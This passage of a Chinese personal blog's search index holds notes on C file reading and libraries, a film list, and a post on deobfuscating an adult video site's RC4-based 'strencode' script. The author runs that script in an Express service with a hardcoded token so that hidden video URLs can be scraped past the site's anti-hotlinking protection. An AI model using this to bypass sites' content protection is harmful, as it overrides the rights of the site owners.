文件读取","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:4:5","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#文件读取"},{"categories":["blog"],"content":" 代码示例 /*文本内容如下 123 哈哈 */ /* 下面这段代码会正确打印文本内容直到结束 */ int str3; while ((str3 = fgetc(f1)) != EOF) { printf(\"%c\", str3); } /* 下面这段代码会多打印一个奇怪的问号符 */ int str2; while (str2 != EOF) { str2 = fgetc(f1); printf(\"%c\", str2); } /* 下面这段代码会把最后的哈哈打印两次 */ char str[4096]; while (!feof(f1)) { fgets(str, 4096, f1); printf(\"%s\", str); } 下面来说说为什么。 先看第一个。首先把数据用 fgetc 取出，然后判断是否为 EOF，选择是否打印。没毛病。 第二个则是先判断是否为 EOF，当我们读取到 ’ 哈 ’ 的时候，先打印出来。然后再判断依旧!=EOF，就会导致把 EOF 读取出来后进行了打印。 feof 是通过返回错误 -1 来停止循环的。所以在使用的时候先进行读取。在循环了 2 次以后，feof 仍然没有收到错误信息。第三次循环的时候 fgets 其实没有读取到数据。但是下面的语句还是得要执行。 /* 改成这样，最后一次读取到了错误，但是下面没有代码了，什么都没发生。循环条件进行判断后跳出循环。 */ char str[4096]; int c = 0; fgets(str, 4096, f1); if (feof(f1)) { printf(\"空文件\\n\"); } else { while (!feof(f1)) { printf(\"%s\", str); fgets(str, 4096, f1); } } ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:4:6","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#代码示例"},{"categories":["blog"],"content":" EOF 和 feofEOF 和 foef 什么时候用呢？ EOF 主要用于文本文件进行判断结尾。不适合或者说不适用于读取二进制文件。 foef 则都可以使用。 那么我到底应该怎么读取文件呢？ 下面这个应该是通用版本。无论是二进制还是文本。 FILE *fp,*xx; int c; fp=fopen(\"/Users/kentxxq/test.txt\",\"rb\"); xx=fopen(\"/Users/kentxxq/xx.txt\",\"wb\"); if(fp==NULL) { printf(\"文件打开错误\"); }else{ c = fgetc(fp); if(ferror(fp)){ printf(\"文件读取失败！\"); }else{ if(feof(fp)){ printf(\"这是一个空文件\"); } else{ while (!feof(fp)){ printf(\"%c\",c); fputc(c, xx); c = fgetc(fp); } } } } ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:4:7","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#eof-和-feof"},{"categories":["blog"],"content":" 静态库和动态库其实我来学 c 相关的知识，最大的动力就是性能以及 c/c++ 有很多的轮子。而我爱用 Python，它与 c 结合非常紧密。 静态库 编译完成以后就不需要 lib 和头文件了，所以是打包到了一起。不方便增量更新、且编译速度会慢一些。 动态库 编译完成以后其实还是需要从指定的路径取引用库文件。二进制分发的你在通过包管理工具安装以后 (例如 sqlite) 会在系统的 include 和 lib 之类的文件夹存放。源码则可以你自己通过编译放在系统或者自己指定的文件夹内。只要能引用到就好了。 windows 下的静态库为 .lib 文件。如果需要使用它，就包含它的头文件。然后 #pragma comment(lib,\"xxx.lib\") 即可直接通过函数名调用。打包后的文件不再 lib 静态库。这是标准做法。 不过我在 vs2019 的实际操作中，略有不同。可参考 微软官方文档 类 *unix 静态库为 .a 文件。用法同上。 windows 下的动态库为 .dll 文件。 动态库有 2 种用法。第一种是隐式调用。第二种是显式调用。注: 隐式调用若主函数是 C++ 程序,需要 extern “C”{}包含被调用函数 (add.c) 的头文件。动态库的文档可以参考这个 微软官方文档 我现在常见的是通过 LoadLibrary 来直接加载 dll 文件，然后通过 typedef 来定义一个函数指针声明出被调用函数的返回类型和参数类型，最后通过 GetProcAddress 来指定内部函数名得到函数赋值给指针。可以看到我们需要有 dll 文件、函数名、函数指针声明函数。而 python 的 ctypes 通过把传入的参数一一转换成了 c 的对应类型，所以函数指针可以自己推断出来是什么样，而我们给 ctypes 提供了必要的 dll 地址和函数名。所以直接传参即可调用。如果传入的参数错误，就直接报错呗~ 通过包含头文件、使用 #pragma comment(lib,\"xxx.lib\") 包含 lib、以及 dll，同静态库也直接通过函数名调用。这里的 lib 文件内部存放的是函数位置和索引。让程序在编译期间使用的。具体的函数体还是存放在 dll 中。 所以动态库两种方法都说明，在打包完程序以后，依旧需要 dll 文件。 类 *unix 动态库为 .so 文件。则对应 dlopen 和 dlsym 来加载和指定函数名。其他原理相同。 我们也知道，windows 一脉相承，提供比较强的兼容性。所以在 windows 上编译后的库，可以兼容多个 windows 版本。 而类 *unix 则不然。多数的做法都是在各个平台上各自编译后分发。 所以也就解决了我对如何使用别人代码库的疑惑。 有源码就下载下来，编译以后你用静态库或者动态库的方式都取决于你。 别人通过二进制分发 (注意选择对应平台的包)，除了 dll 也都会提供.h 的头文件。如果只有一个 dll 呢？那你就对着文档写就一个头文件或者函数指针用。头文件其实和 typedef 函数指针的目的是一样的，让 c/c++ 的代码能获取到函数的相关信息，从而正确编译。因此调用 dll 不用包含头文件也是可以的。只是如果别人做好了库给你用，肯定也会提供给你这个库的调用方法，不提供 h 头文件是他懒！ ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:4:8","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#静态库和动态库"},{"categories":["blog"],"content":" 总结在写这篇文章之前。好久没有写博客了。。偶尔更新一些影片记录而已。 最近也弄了一个域名邮箱，把联系地址改成了邮箱地址。 我大概看了 1 个月的 c 相关的东西。。才写完这点点东西。过程感觉还是很痛苦的，c 语言很简单，但是经常会涉及到系统、编译、环境、调试方面的问题。但是写完以后觉得豁然开朗。对以后的编码也有了更加清晰的理解。 不得不说一句，微软的文档是真的强。。我正在准备彻底抛弃苹果，面向微软。。如果你看不懂这篇文章，取参考微软的文档。毕竟那是 windows 的标准文档啊，绝不会错！ ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:5:0","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#总结"},{"categories":["blog"],"content":"编程语言多种多样。但是常见在视野中的，就那么一些。其中js就是一个无法忽视的存在。自从有了nodejs，前端迅速得开始了自己的工程化道理。各种框架满天飞。号称一切能用js来写的东西，都可以用js写出来。我本人对js是无感的。论性能没有静态语言好，论快捷没有python好，论黑魔法没有ruby好。要说跨平台展示，也有很多的方案不比js差。但是你架不住它的确是web的标准。。再怎么不搭理它，你也要懂它","date":"2019-05-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/","series":null,"tags":["blog","js"],"title":"使用js来帮助加解密信息","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/"},{"categories":["blog"],"content":" 简介编程语言多种多样。但是常见在视野中的，就那么一些。其中 js 就是一个无法忽视的存在。 自从有了 nodejs，前端迅速得开始了自己的工程化道理。各种框架满天飞。号称一切能用 js 来写的东西，都可以用 js 写出来。 我本人对 js 是无感的。论性能没有静态语言好，论快捷没有 python 好，论黑魔法没有 ruby 好。要说跨平台展示，也有很多的方案不比 js 差。 但是你架不住它的确是 web 的标准。。再怎么不搭理它，你也要懂它。 ","date":"2019-05-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/:1:0","series":null,"tags":["blog","js"],"title":"使用js来帮助加解密信息","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/#简介"},{"categories":["blog"],"content":" 初衷最近是一直在看 flutter，同时在学着做一个 app。以后要是有需要，我起码也有个东西可以展示一下。 现在的网站大多数都进行了反爬虫，反盗链等等处理。算是对自身版权的一种保护措施。无可厚非。也让你在学习的道路上接触到了更多的知识面。 出于学习的目的，我也就要迎难而上了。 ","date":"2019-05-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/:2:0","series":null,"tags":["blog","js"],"title":"使用js来帮助加解密信息","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/#初衷"},{"categories":["blog"],"content":" html 代码被 js 加密","date":"2019-05-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/:3:0","series":null,"tags":["blog","js"],"title":"使用js来帮助加解密信息","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/#html-代码被-js-加密"},{"categories":["blog"],"content":" 分析页面在 91porn 的视频播放页。 在 chrome 浏览器中有 mp4 地址，但是我在抓取完页面以后，没有找到 video 标签的 mp4 信息。 原因就在下面这一段 document.write(strencode(\"Y31+QVcpMF49ISQcEQIVdn5TEn8xJyV6CBMJTiEHLgIYWSNwO1JWS3Q8BU88TV4sESYmFwQIOhYnFHhxIyYCRTcuflgPGAVXegUkFDkeNDQrWhJtXC8CERcaFAc8JS8vES41RQUKMwF7IDBTejdeSBgQEBM+DB4lGTIdYQBsMwsHVBtFFCUVMCtXVh19dlMc\",\"35073qz4grffroXO4azOUodLDj16nSIwU3vAw8128Vn8p4gXrbwmHrwnhP5DmO71Tj/wl+Tn+Rruh/rsr6uY9kXaFORTYNCBEyc1asim+tub4c50UDIkqHGKPzOTc+f2MgA5NbCFgegj\",\"Y31+QVcpMF49ISQcEQIVdn5TEn8xJyV6CBMJTiEHLgIYWSNwO1JWS3Q8BU88TV4sESYmFwQIOhYnFHhxIyYCRTcuflgPGAVXegUkFDkeNDQrWhJtXC8CERcaFAc8JS8vES41RQUKMwF7IDBTejdeSBgQEBM+DB4lGTIdYQBsMwsHVBtFFCUVMCtXVh19dlMc\")); 我对 js 的方法不是很熟，于是谷歌了一下，发现 strencode 是一个编码库，或者说是一个加密库。 于是我在页面请求的资源中，搜索 strencode，定位到了 md5.js 中。 ;var encode_version = 'sojson.v5', lbbpm = '__0x33ad7', __0x33ad7=['QMOTw6XDtVE=','w5XDgsORw5LCuQ==','wojDrWTChFU=','dkdJACw=','w6zDpXDDvsKVwqA=','ZifCsh85fsKaXsOOWg==','RcOvw47DghzDuA==','w7siYTLCnw=='];(function(_0x94dee0,_0x4a3b74){var _0x588ae7=function(_0x32b32e){while(--_0x32b32e){_0x94dee0['push'](_0x94dee0['shift']());}};_0x588ae7(++_0x4a3b74);}(__0x33ad7,0x8f));var _0x5b60=function(_0x4d4456,_0x5a24e3){_0x4d4456=_0x4d4456-0x0;var _0xa82079=__0x33ad7[_0x4d4456];if(_0x5b60['initialized']===undefined){(function(){var _0xef6e0=typeof window!=='undefined'?window:typeof process==='object'\u0026\u0026typeof require==='function'\u0026\u0026typeof global==='object'?global:this;var _0x221728='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xef6e0['atob']||(_0xef6e0['atob']=function(_0x4bb81e){var _0x1c1b59=String(_0x4bb81e)['replace'](/=+$/,'');for(var _0x5e3437=0x0,_0x2da204,_0x1f23f4,_0x3f19c1=0x0,_0x3fb8a7='';_0x1f23f4=_0x1c1b59['charAt'](_0x3f19c1++);~_0x1f23f4\u0026\u0026(_0x2da204=_0x5e3437%0x4?_0x2da204*0x40+_0x1f23f4:_0x1f23f4,_0x5e3437++%0x4)?_0x3fb8a7+=String['fromCharCode'](0xff\u0026_0x2da204\u003e\u003e(-0x2*_0x5e3437\u00260x6)):0x0){_0x1f23f4=_0x221728['indexOf'](_0x1f23f4);}return _0x3fb8a7;});}());var _0x43712e=function(_0x2e9442,_0x305a3a){var _0x3702d8=[],_0x234ad1=0x0,_0xd45a92,_0x5a1bee='',_0x4a894e='';_0x2e9442=atob(_0x2e9442);for(var _0x67ab0e=0x0,_0x1753b1=_0x2e9442['length'];_0x67ab0e\u003c_0x1753b1;_0x67ab0e++){_0x4a894e+='%'+('00'+_0x2e9442['charCodeAt'](_0x67ab0e)['toString'](0x10))['slice'](-0x2);}_0x2e9442=decodeURIComponent(_0x4a894e);for(var _0x246dd5=0x0;_0x246dd5\u003c0x100;_0x246dd5++){_0x3702d8[_0x246dd5]=_0x246dd5;}for(_0x246dd5=0x0;_0x246dd5\u003c0x100;_0x246dd5++){_0x234ad1=(_0x234ad1+_0x3702d8[_0x246dd5]+_0x305a3a['charCodeAt'](_0x246dd5%_0x305a3a['length']))%0x100;_0xd45a92=_0x3702d8[_0x246dd5];_0x3702d8[_0x246dd5]=_0x3702d8[_0x234ad1];_0x3702d8[_0x234ad1]=_0xd45a92;}_0x246dd5=0x0;_0x234ad1=0x0;for(var _0x39e824=0x0;_0x39e824\u003c_0x2e9442['length'];_0x39e824++){_0x246dd5=(_0x246dd5+0x1)%0x100;_0x234ad1=(_0x234ad1+_0x3702d8[_0x246dd5])%0x100;_0xd45a92=_0x3702d8[_0x246dd5];_0x3702d8[_0x246dd5]=_0x3702d8[_0x234ad1];_0x3702d8[_0x234ad1]=_0xd45a92;_0x5a1bee+=String['fromCharCode'](_0x2e9442['charCodeAt'](_0x39e824)^_0x3702d8[(_0x3702d8[_0x246dd5]+_0x3702d8[_0x234ad1])%0x100]);}return _0x5a1bee;};_0x5b60['rc4']=_0x43712e;_0x5b60['data']={};_0x5b60['initialized']=!![];}var _0x4be5de=_0x5b60['data'][_0x4d4456];if(_0x4be5de===undefined){if(_0x5b60['once']===undefined){_0x5b60['once']=!![];}_0xa82079=_0x5b60['rc4'](_0xa82079,_0x5a24e3);_0x5b60['data'][_0x4d4456]=_0xa82079;}else{_0xa82079=_0x4be5de;}return _0xa82079;};if(typeof encode_version!=='undefined'\u0026\u0026encode_version==='sojson.v5'){function strencode(_0x50cb35,_0x1e821d){var _0x59f053={'MDWYS':'0|4|1|3|2','uyGXL':function _0x3726b1(_0x2b01e8,_0x53b357){return _0x2b01e8(_0x53b357);},'otDTt':function _0x4f6396(_0x33a2eb,_0x5aa7c9){return _0x33a2eb\u003c_0x5aa7c9;},'tPPtN':function _0x3a63ea(_0x1546a9,_0x3fa992){return _0x1546a9%_0x3fa992;}};var _0xd6483c=_0x59f053[_0x5b60('0x0','cEiQ')][_0x5b60('0x1','\u0026]Gi')]('|'),_0x1a3127=0x0;while(!![]){switch(_0xd6483c[_0x1a3127++]){case'0':_0x50cb35=_0x59f053[_0x5b60('0x2','ofbL')](atob,_0x50cb35);continue;case'1':code='';continu","date":"2019-05-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/:3:1","series":null,"tags":["blog","js"],"title":"使用js来帮助加解密信息","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/#分析页面"},{"categories":["blog"],"content":" 解决办法到这里，一般有 3 种方法来继续你的工作 把这一大段的 js 翻译成 dart。缺点是耗时耗力，如果加密算法修改，你可能要重新来过。之前我的 python 爬虫就是这样的，不过那个加密算法才几行而已。 如果语言有工具支持运行 js，那么就好办了。js 自己跑 js 代码肯定没问题。而 v8 就是用 c++ 写的，c++ 肯定有库可以调用。java1.8 版本也有 js 引擎。c#则有 jint。而 python 则是调用本机的 node 环境，速度不理想。而我写 flutter 没有找到这种方法。 用 headless 浏览器来解析页面，然后把拿到最终结果。把地址解析出来。在 flutter 中也就是使用 webview 插件。缺点很慢很重。 于是我想到了远程 api 来执行代码。 ","date":"2019-05-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/:3:2","series":null,"tags":["blog","js"],"title":"使用js来帮助加解密信息","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/#解决办法"},{"categories":["blog"],"content":" 搭建基于 nodejs 的 web 服务","date":"2019-05-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/:4:0","series":null,"tags":["blog","js"],"title":"使用js来帮助加解密信息","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/#搭建基于-nodejs-的-web-服务"},{"categories":["blog"],"content":" web 代码搜了一下，express 貌似在 nodejs 里是很火的 web 框架。 于是基于 helloWorld 改了一点点。代码如下 //web框架 var express = require('express'); //body的解析工具 var bodyParser = require('body-parser'); var app = express(); var f = require('./decode') //一些解析设置 app.use(bodyParser.json()); app.use(bodyParser.urlencoded({ extended: false })); app.get('/', function (req, res) { res.send('Hello World!'); }); app.post('/', function (req, res) { //验证是不是合法的请求 if (req.body.token === 'qwer') { data = f(req.body.param1, req.body.param2) res.send(data) } else { res.send('fuck you!'); } }); app.listen(3000, function () { console.log('Example app listening on port 3000!'); }); ","date":"2019-05-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/:4:1","series":null,"tags":["blog","js"],"title":"使用js来帮助加解密信息","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/#web-代码"},{"categories":["blog"],"content":" 解密代码这个是 decode.js 文件的代码,我包成了一个方法，补上了几个用到的的变量。 'use strict'; module.exports = function (data1, data2) { //补上的变量 var len; var code; var i; var k; /** @type {string} */ var encode_version = \"sojson.v5\"; /** @type {string} */ var lbbpm = \"__0x33ad7\"; /** @type {!Array} */ var __0x33ad7 = [\"QMOTw6XDtVE=\", \"w5XDgsORw5LCuQ==\", \"wojDrWTChFU=\", \"dkdJACw=\", \"w6zDpXDDvsKVwqA=\", \"ZifCsh85fsKaXsOOWg==\", \"RcOvw47DghzDuA==\", \"w7siYTLCnw==\"]; (function (data, i) { /** * @param {number} isLE * @return {undefined}strencode */ var write = function (isLE) { for (; --isLE;) { data[\"push\"](data[\"shift\"]()); } }; write(++i); })(__0x33ad7, 143); /** * @param {string} name * @param {string} ll * @return {?} */ var _0x5b60 = function (name, ll) { /** @type {number} */ name = name - 0; var result = __0x33ad7[name]; if (_0x5b60[\"initialized\"] === undefined) { (function () { var jid = typeof window !== \"undefined\" ? window : typeof process === \"object\" \u0026\u0026 typeof require === \"function\" \u0026\u0026 typeof global === \"object\" ? global : this; /** @type {string} */ var listeners = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"; if (!jid[\"atob\"]) { /** * @param {?} i * @return {?} */ jid[\"atob\"] = function (i) { var str = String(i)[\"replace\"](/=+$/, \"\"); /** @type {number} */ var bc = 0; var bs; var buffer; /** @type {number} */ var Y = 0; /** @type {string} */ var pix_color = \"\"; for (; buffer = str[\"charAt\"](Y++); ~buffer \u0026\u0026 (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? pix_color = pix_color + String[\"fromCharCode\"](255 \u0026 bs \u003e\u003e (-2 * bc \u0026 6)) : 0) { buffer = listeners[\"indexOf\"](buffer); } return pix_color; }; } })(); /** * @param {string} data * @param {!Object} fn * @return {?} */ var testcase = function (data, fn) { /** @type {!Array} */ var secretKey = []; /** @type {number} */ var y = 0; var temp; /** @type {string} */ var testResult = \"\"; /** @type {string} */ var tempData = \"\"; /** @type {string} */ data = atob(data); /** @type {number} */ var val = 0; var key = data[\"length\"]; for (; val \u003c key; val++) { /** @type {string} */ tempData = tempData + (\"%\" + (\"00\" + data[\"charCodeAt\"](val)[\"toString\"](16))[\"slice\"](-2)); } /** @type {string} */ data = decodeURIComponent(tempData); /** @type {number} */ var x = 0; for (; x \u003c 256; x++) { /** @type {number} */ secretKey[x] = x; } /** @type {number} */ x = 0; for (; x \u003c 256; x++) { /** @type {number} */ y = (y + secretKey[x] + fn[\"charCodeAt\"](x % fn[\"length\"])) % 256; temp = secretKey[x]; secretKey[x] = secretKey[y]; secretKey[y] = temp; } /** @type {number} */ x = 0; /** @type {number} */ y = 0; /** @type {number} */ var i = 0; for (; i \u003c data[\"length\"]; i++) { /** @type {number} */ x = (x + 1) % 256; /** @type {number} */ y = (y + secretKey[x]) % 256; temp = secretKey[x]; secretKey[x] = secretKey[y]; secretKey[y] = temp; testResult = testResult + String[\"fromCharCode\"](data[\"charCodeAt\"](i) ^ secretKey[(secretKey[x] + secretKey[y]) % 256]); } return testResult; }; /** @type {function(string, !Object): ?} */ _0x5b60[\"rc4\"] = testcase; _0x5b60[\"data\"] = {}; /** @type {boolean} */ _0x5b60[\"initialized\"] = !![]; } var functionEntry = _0x5b60[\"data\"][name]; if (functionEntry === undefined) { if (_0x5b60[\"once\"] === undefined) { /** @type {boolean} */ _0x5b60[\"once\"] = !![]; } result = _0x5b60[\"rc4\"](result, ll); _0x5b60[\"data\"][name] = result; } else { result = functionEntry; } return result; }; if (typeof encode_version !== \"undefined\" \u0026\u0026 encode_version === \"sojson.v5\") { /** * @param {?} key * @param {!Object} object * @return {?} */ var strencode = function (key, object) { var self = { \"MDWYS\": \"0|4|1|3|2\", \"uyGXL\": function _cancelTransitioning(cb, TextureClass) { return cb(TextureClass); }, \"otDTt\": function handleSlide(isSlidingUp, $cont) { return isSlidingUp \u003c $cont; }, \"tPPtN\": function handleSlide(isSlidingUp, $cont) { return isSlidingUp % $cont; } }; var callbackVals = self[_0x5b60(\"0x0\", \"cEiQ\")][_0x5b60(\"0x1\", \"\u0026]Gi\")](\"|\"); /** @type {number} */ var callbackCount = 0; for (; !!","date":"2019-05-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/:4:2","series":null,"tags":["blog","js"],"title":"使用js来帮助加解密信息","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/#解密代码"},{"categories":["blog"],"content":" 测试把代码跑起来。测试成果 ojbk！ ","date":"2019-05-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/:4:3","series":null,"tags":["blog","js"],"title":"使用js来帮助加解密信息","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/#测试"},{"categories":["blog"],"content":" 总结后续我就只要把页面的参数用正则表达式弄出来。然后发送给我自己的服务器，就能获得地址啦！ 为什么我这样做呢？因为我有一台自己的服务器。后续在一些其他的应用中，我也会有更多这样的需求。所以搭建一个这样的 web 服务是非常值得的。 不得不说哪怕你再怎么骂，js 都是程序员的必经之路。 ","date":"2019-05-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/:5:0","series":null,"tags":["blog","js"],"title":"使用js来帮助加解密信息","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%BD%BF%E7%94%A8js%E6%9D%A5%E5%B8%AE%E5%8A%A9%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BF%A1%E6%81%AF/#总结"},{"categories":["blog"],"content":"我看过了太多太多的影片。有好的，有坏的。我不觉得这是小学生的作业，是观后感流水账。所以不会统统记录下来。单独写出文章的影片，都是我自己觉得感触良多。正如阿甘正传里的一句台词:你永远也不会知道下一口糖果会是什么味道。下面只是我的个人推荐列表。不希望大家都能觉得好看，但希望会有一部影片，能触动到你","date":"2019-04-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E5%BD%B1%E7%89%87%E8%AE%B0%E5%BD%95/","series":null,"tags":["blog","影片"],"title":"我的影片记录","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E5%BD%B1%E7%89%87%E8%AE%B0%E5%BD%95/"},{"categories":["blog"],"content":" 简介lines 我看过了太多太多的影片。有好的，有坏的。 我不觉得这是小学生的作业，最终全变成观后感流水账。所以不会统统记录下来。 单独写出文章的影片，都是我自己觉得感触良多。 正如阿甘正传里的一句台词: 生活就像是一盒巧克力，你永远不会知道下一盒会是什么味道。 所以我不会给出关于影片的介绍。因为那是一种个人观点，也是一种剧透吧。 我也同样不会给影片进行分类，因为一部好影片是多方面的。而不仅仅是拍摄后的故事。 下面只是我的个人推荐列表。 ","date":"2019-04-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E5%BD%B1%E7%89%87%E8%AE%B0%E5%BD%95/:1:0","series":null,"tags":["blog","影片"],"title":"我的影片记录","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E5%BD%B1%E7%89%87%E8%AE%B0%E5%BD%95/#简介"},{"categories":["blog"],"content":" 影片列表 燕尾蝶 未麻的部屋 大话西游 - 系列 革命之路 无敌破坏王 王家卫 - 所有执导影片，外加一部纪录片 (摄氏零度 - 春光再现) 爱乐之城 佐伊 geostorm 人工智能 风雨哈弗路 垫底辣妹 一个明星的诞生 天气之子 活埋 此房是我造 海角七号 成为简·奥斯汀 华尔街之狼 解除好友 - 系列 亲爱的杀手 (be alive just like you) 网络迷踪 life is beautiful 午夜巴塞罗那 hello,树先生 抱歉打扰 头文字 D 戏梦巴黎 龙在边缘 千与千寻 奔腾年代 驴得水 初恋五十次 别告诉她 (The Farewell) 危楼愚夫 精武英雄 前目的地 他其实没那么喜欢你 初恋红豆冰 秒速五厘米 盲井 十二猴子 怦然心动 搏击俱乐部 